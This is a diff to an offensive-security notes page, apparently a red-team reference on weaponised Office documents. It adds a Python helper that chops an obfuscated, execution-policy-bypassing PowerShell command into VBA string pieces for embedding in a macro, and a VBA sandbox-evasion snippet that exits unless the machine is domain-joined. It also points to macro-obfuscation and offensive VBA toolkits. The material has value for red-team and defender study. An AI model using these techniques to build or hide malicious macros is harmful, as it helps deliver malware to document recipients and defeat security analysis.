@@ -15,7 +15,63 @@ The process to create a canary image in a Word `.docx` document is as follow:
   - Categories: "Links and References"
   - IncludePicture -> "File name or URL": `http://<IP>/canary.gif`
 
-### Office documents with macro
+
+### Office documents with VBA macro
+
+###### PowerShell code in VBA macro
+
+The following Python script transforms a PowerShell command into a
+multi-lines VBA string declaration. It is notably useful for long obfuscated PowerShell command that doesn't fit into a single line VBA string declaration.
+
+As an example, the scripts produces the following output:
+
+```bash
+# input PowerShell example, produced by Invoke-Obfuscation: cmd.exe /c PoWeRSheLL -exeCUtI BYPASs -noEXIT -COmma  "\"[...]')"
+
+s0 = "PoWeRSheLL -exeCUtI BYPASs -noEXIT -COmma  ""\""$(SEt-vArIabLe  'Ofs' '') \"" + [ST"
+[...]
+s98 = "Mspec[4,26,25]-jOin'')"""
+
+cmdStr = "cmd.exe /c " & s0 & s1 & s2 & s3 & s4 & s5 & s6 & s7 & s8 & s9 & s10 & s11
+[...]
+cmdStr = cmdStr & s89 & s90 & s91 & s92 & s93 & s94 & s95 & s96 & s97 & s98
+```
+
+```python
+powershell_file = r'<POWERSHELL_COMMAND_FILE>'
+
+# Number of char to split the PowerShell command in
+n = 80
+
+with open(powershell_file, 'r') as f:
+    file_content = f.read()
+    print (file_content)
+    substrings = [file_content[i:i+n] for i in range(0, len(file_content), n)]
+
+    substring_index = 0
+    for substring in substrings:
+        if '"' in substring:
+            substring = substring.replace('"', '""')
+        if '\n' in substring:
+            substring = substring.replace('\n', '')
+
+        print (f'\ts{substring_index} = "{substring}"')
+        substring_index = substring_index + 1
+
+    concat_str = '\tcmdStr = "cmd.exe /c " & s0'
+    if substring_index > 2:
+        for i in range(1, substring_index - 1):
+            if len(concat_str) > n:
+                print (concat_str)
+                concat_str = f'\tcmdStr = cmdStr & s{i}'
+            else:
+                concat_str = f'{concat_str} & s{i}'
+
+    if substring_index > 1:
+        concat_str = f'{concat_str} & s{substring_index - 1} & " # "" & :: "'
+
+    print (concat_str)
+```
 
 ###### Automatic macros ("auto macros")
 
@@ -76,7 +132,7 @@ End Sub
 [`macro_pack`](https://github.com/sevagas/macro_pack) is a Python script that
 automatically obfuscate `VBA` macros and generate documents embedding macros. A
 "community version" is open sourced and a "pro version", that includes
-additional features, can be purchased.  
+additional features, can be purchased.
 
 The following output formats are supported by `macro_pack` (listed using
 `macro_pack.exe --listformats`):
@@ -151,6 +207,33 @@ command line. The technique can be conducted as follow:
 available in the
 [`spoofing-office-macro`](https://github.com/christophetd/spoofing-office-macro)
 GitHub repository.
+
+###### Anti-sanboxes detection
+
+The
+[following `VBA` code-snippet](https://github.com/S3cur3Th1sSh1t/OffensiveVBA/blob/main/src/SandBoxEvasion/CheckDomain.vba)
+detect if the code is executed on a  domain-joined computer, and exit if not.
+It can be used to detect if the macro is being executed in a emulated
+environment or sandboxe.
+
+```
+Sub CheckDomain()
+On Error Resume Next
+Set objRootDSE = GetObject("LDAP://RootDSE")
+If Err.Number <> 0 Then
+wscript.Quit
+End If
+On Error GoTo 0
+End Sub
+```
+
+###### Others VBA code-snippets
+
+The [`OffensiveVBA`](https://github.com/S3cur3Th1sSh1t/OffensiveVBA) GitHub
+repository centralizes a number of `VBA` code-snippets for code execution, sandboxes detection, persistence, etc.
+
+###### Remote template injection
+
 
 --------------------------------------------------------------------------------
 
